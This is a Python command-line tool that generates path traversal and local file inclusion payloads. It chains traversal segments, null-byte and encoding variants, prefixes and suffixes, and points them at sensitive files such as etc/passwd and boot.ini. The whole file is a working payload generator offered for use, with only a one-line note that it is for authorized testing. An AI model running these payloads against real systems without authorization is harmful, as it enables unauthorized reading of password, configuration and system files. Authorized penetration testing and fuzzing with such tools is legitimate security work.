#!/usr/bin/env python3
"""Path traversal / LFI payload generator.

Chains traversal segments, optional prefixes/suffixes and target files
into test payloads. For authorized security testing only.

Generation is lazy end-to-end; use --estimate to get the exact payload
count of a configuration before producing it.
"""

from __future__ import annotations

import argparse
import itertools
import sys
from collections.abc import Iterable, Iterator, Sequence
from dataclasses import dataclass
from urllib.parse import quote

# --- Building blocks ----------------------------------------------------------

SEGMENT_PRESETS: dict[str, list[str]] = {
    "unix": ["../", "./", ".\\./", ""],
    "windows": ["..\\", ".\\", ""],
}
SEGMENT_PRESETS["both"] = sorted(set(SEGMENT_PRESETS["unix"] + SEGMENT_PRESETS["windows"]))

SLASH_VARIANTS = ["/", "", "///", "//", "%25%5c", "%5c", "\\", "\\\\"]
DOT_VARIANTS = ["", ".", "%2e", "%%32%65%"]

PREFIXES = ["/%00/", "/%2500/", "/&apos;/", "/"]
SUFFIXES = ["", "%00", "#", "^^"]

TARGETS = {
    "linux": ["etc/passwd", "etc/hosts"],
    "windows": ["boot.ini", "C://boot.ini"],
}

# --- Configuration ------------------------------------------------------------

@dataclass(frozen=True)
class Config:
    os: str = "linux"
    segments: str = "unix"
    depth: int = 4
    prefix: bool = False
    suffix: bool = False
    extension: str | None = None
    slash_variants: bool = False
    dot_variants: bool = False
    unique: bool = False
    urlencode: int = 0
    extra_targets: tuple[str, ...] = ()

# --- Combinators (lazy) -------------------------------------------------------

def chain_segments(segments: Sequence[str], max_depth: int) -> Iterator[str]:
    """Yield concatenations of `segments` for every length 1..max_depth."""
    for length in range(1, max_depth + 1):
        for combo in itertools.product(segments, repeat=length):
            yield "".join(combo)


def combine(first: Iterable[str], second: Sequence[str]) -> Iterator[str]:
    """Cartesian-product concatenation. `second` must be re-iterable."""
    for a in first:
        for b in second:
            yield a + b


def replace_variants(text: str, target: str, replacements: Sequence[str]) -> Iterator[str]:
    """Yield every variant of `text` where each occurrence of `target`
    is independently replaced by one of `replacements`."""
    if not target:
        raise ValueError("target must be non-empty")
    parts = text.split(target)
    for fillers in itertools.product(replacements, repeat=len(parts) - 1):
        variant = parts[0]
        for filler, part in zip(fillers, parts[1:]):
            variant += filler + part
        yield variant


def dedupe(items: Iterable[str]) -> Iterator[str]:
    seen: set[str] = set()
    for item in items:
        if item not in seen:
            seen.add(item)
            yield item

# --- Pipeline -----------------------------------------------------------------

def resolve_components(cfg: Config) -> tuple[list[str], list[str], list[str], list[str], list[str]]:
    """Materialize the five small component lists; payloads stay lazy."""
    targets = TARGETS["linux"] + TARGETS["windows"] if cfg.os == "both" else list(TARGETS[cfg.os])
    targets.extend(cfg.extra_targets)

    # dict.fromkeys: dedupe while preserving order (the "" segment makes
    # many raw combinations collide into the same chain)
    chains = list(dict.fromkeys(chain_segments(SEGMENT_PRESETS[cfg.segments], cfg.depth)))

    prefixes = PREFIXES if cfg.prefix else [""]
    extensions = ["." + cfg.extension] if cfg.extension else [""]
    suffixes = SUFFIXES if cfg.suffix else [""]
    return prefixes, chains, targets, extensions, suffixes


def generate(cfg: Config) -> Iterator[str]:
    prefixes, chains, targets, extensions, suffixes = resolve_components(cfg)

    payloads: Iterable[str] = combine(prefixes, chains)
    payloads = combine(payloads, targets)
    payloads = combine(payloads, extensions)
    payloads = combine(payloads, suffixes)

    if cfg.slash_variants:
        payloads = itertools.chain.from_iterable(
            replace_variants(p, "/", SLASH_VARIANTS) for p in payloads)
    if cfg.dot_variants:
        payloads = itertools.chain.from_iterable(
            replace_variants(p, ".", DOT_VARIANTS) for p in payloads)
    if cfg.unique:
        payloads = dedupe(payloads)
    for _ in range(cfg.urlencode):
        payloads = (quote(p, safe="") for p in payloads)
    return iter(payloads)


def estimate(cfg: Config) -> int:
    """Exact payload count without generating anything.

    No slash-variant string contains a "." and no dot-variant string
    contains a "/", so the two expansions are independent and the total
    factorizes across the five payload components:
        product over components of  sum over items of  vs^slashes * vd^dots
    """
    v_slash = len(SLASH_VARIANTS) if cfg.slash_variants else 1
    v_dot = len(DOT_VARIANTS) if cfg.dot_variants else 1

    total = 1
    for component in resolve_components(cfg):
        total *= sum(
            v_slash ** item.count("/") * v_dot ** item.count(".")
            for item in component
        )
    return total

# --- CLI ----------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Generate path-traversal/LFI test payloads.",
        epilog="example: %(prog)s --os both --segments both --depth 4 --prefix --suffix "
               "--unique -o payloads.txt",
    )
    p.add_argument("--os", choices=["linux", "windows", "both"], default="linux",
                   help="target file list (default: linux)")
    p.add_argument("--segments", choices=["unix", "windows", "both"], default="unix",
                   help="traversal segment style (default: unix)")
    p.add_argument("--depth", type=int, default=4,
                   help="max chained traversal segments (default: 4)")
    p.add_argument("--prefix", action="store_true",
                   help="prepend null-byte / absolute-path prefixes")
    p.add_argument("--suffix", action="store_true",
                   help="append null-byte / comment suffixes")
    p.add_argument("--extension", metavar="EXT",
                   help="append a file extension, e.g. --extension html")
    p.add_argument("--target", action="append", default=[], metavar="PATH",
                   help="extra target file; repeatable")
    p.add_argument("--targets-file", metavar="FILE",
                   help="file with extra targets, one per line (# comments ok)")
    p.add_argument("--slash-variants", action="store_true",
                   help="expand every '/' into slash variants (output grows fast)")
    p.add_argument("--dot-variants", action="store_true",
                   help="expand every '.' into dot variants (output grows very fast)")
    p.add_argument("--urlencode", type=int, choices=[0, 1, 2], default=0,
                   help="URL-encode each payload N times (default: 0)")
    p.add_argument("--unique", action="store_true",
                   help="drop duplicates (keeps a set in memory)")
    p.add_argument("--limit", type=int, default=0, metavar="N",
                   help="stop after N payloads (0 = no limit)")
    p.add_argument("--estimate", action="store_true",
                   help="print the exact payload count for this config and exit")
    p.add_argument("--count-only", action="store_true",
                   help="generate, but print only the payload count")
    p.add_argument("-o", "--output", metavar="FILE",
                   help="write to FILE instead of stdout")
    return p


def config_from_args(args: argparse.Namespace) -> Config:
    extra = list(args.target)
    if args.targets_file:
        with open(args.targets_file, encoding="utf-8") as fh:
            extra.extend(
                stripped for line in fh
                if (stripped := line.strip()) and not stripped.startswith("#")
            )
    return Config(
        os=args.os, segments=args.segments, depth=args.depth,
        prefix=args.prefix, suffix=args.suffix, extension=args.extension,
        slash_variants=args.slash_variants, dot_variants=args.dot_variants,
        unique=args.unique, urlencode=args.urlencode,
        extra_targets=tuple(extra),
    )


def main(argv: Sequence[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.depth < 1:
        parser.error("--depth must be >= 1")
    try:
        cfg = config_from_args(args)
    except OSError as exc:
        parser.error(str(exc))

    if args.estimate:
        note = " (upper bound: --unique may shrink it)" if cfg.unique else ""
        print(f"{estimate(cfg):,} payload(s){note}")
        return 0

    out = open(args.output, "w", encoding="utf-8") if args.output else sys.stdout
    count = 0
    try:
        for payload in generate(cfg):
            if args.limit and count >= args.limit:
                break
            count += 1
            if not args.count_only:
                print(payload, file=out)
    except BrokenPipeError:
        pass  # e.g. piping into `head`
    finally:
        if out is not sys.stdout:
            out.close()

    print(f"generated {count:,} payload(s)", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
